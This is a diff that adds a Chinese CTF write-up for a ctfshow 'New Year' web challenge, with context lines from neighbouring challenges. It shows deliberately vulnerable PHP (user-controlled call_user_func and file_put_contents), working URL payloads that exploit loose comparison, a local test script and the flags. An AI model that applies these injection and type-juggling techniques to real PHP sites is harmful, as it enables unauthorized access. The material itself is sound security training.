@@ -5949,10 +5949,8 @@ Array ( [_GET] => Array ( [f] => print_r(get_defined_vars()); ) [_POST] => Array
 # @email: h1xa@ctfer.com
 # @link: https://ctfer.com
 */
-
 highlight_file(__FILE__);
 error_reporting(0);
-
 $content = $_GET[content];
 file_put_contents($content,'<?php exit();'.$content);
 ```
@@ -6046,16 +6044,15 @@ ctfshow{e585186c-c242-467b-b5a6-424266ef4038}
 # @email: h1xa@ctfer.com
 # @link: https://ctfer.com
 */
-
 highlight_file(__FILE__);
 session_start();
 error_reporting(0);
 include "flag.php";
 if(count($_POST)===1){
     extract($_POST);
-        if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
-            echo $flag;
-        }
+    if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
+        echo $flag;
+    }
 }
 ?>
 ```
@@ -6089,6 +6086,68 @@ session_id=session_id
 ```
 
 提交`ctfshow{5109b79e-a325-46b1-a349-3f1cce25cb76}`即可。
+
+------
+
+### 新春欢乐赛web3
+
+靶机的源码如下：
+
+```php
+<?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2022-01-16 15:42:02
+# @Last Modified by:   h1xa
+# @Last Modified time: 2022-01-24 22:14:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+highlight_file(__FILE__);
+error_reporting(0);
+include "flag.php";
+$key=  call_user_func(($_GET[1]));
+if($key=="HappyNewYear"){
+  echo $flag;
+}
+die("虎年大吉，新春快乐！");
+```
+
+利用弱类型比较的缺点，只要`$key`为`true`，`$key=="HappyNewYear"`就一定为真，即可拿到`flag`。
+
+这一系列`Payload`都能拿到`flag`。
+
+- `json_last_error`：如果有，返回`JSON`编码解码时最后发生的错误。
+- `error_reporting`：如果没有设置可选参数`level`，`error_reporting()`仅会返回当前的错误报告级别。
+- `session_start`：开启`session`。
+
+```
+/?1=session_start
+/?1=error_reporting
+/?1=json_last_error
+```
+
+我们可以在本机用`PHP`做一个简单的试验。
+
+```php
+<?php
+$key = call_user_func('json_last_error');
+# $key = call_user_func('session_start');
+# $key = call_user_func('error_reporting');
+var_dump($key);
+// $val = "happy";
+if($key=='happy'){
+    var_dump($key);
+    // var_dump($val);
+    echo "happy";
+}else{
+    var_dump($val);
+    echo 'failed';
+}?>
+```
+
+提交`ctfshow{a55728b2-9232-41ea-b721-480914537107}`即可。
 
 ------
 
